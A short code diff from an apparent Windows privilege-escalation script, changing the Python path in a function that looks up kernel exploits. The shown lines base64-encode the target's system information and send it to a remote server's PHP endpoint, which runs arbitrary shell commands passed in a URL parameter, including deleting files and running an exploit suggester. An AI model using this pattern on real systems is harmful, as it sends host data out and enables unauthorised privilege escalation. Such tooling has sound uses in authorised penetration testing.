@@ -418,7 +418,7 @@ function GetKernelExploits{
     $fileContentEncoded = [System.Convert]::ToBase64String($fileContentBytes)
     (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=echo $fileContentEncoded | base64 -d > systeminfo.txt" -UseBasicParsing).content;
     (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=rm *.xls  " -UseBasicParsing).content; 
-    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python windows-exploit-suggester.py -u " -UseBasicParsing).content; 
+    (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=/usr/bin/python2.7 windows-exploit-suggester.py -u " -UseBasicParsing).content; 
     (Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=/usr/bin/python2.7 windows-exploit-suggester.py -i systeminfo.txt -d  *.xls " -UseBasicParsing).content; 
     #$i = 'Elevation of Privilege';
     #(Invoke-WebRequest -URI "http://$remote_check/winprivesc/remotecheck.php?cmd=python3 wes.py systeminfo.txt -i $i --exploits-only  " -UseBasicParsing).content; 
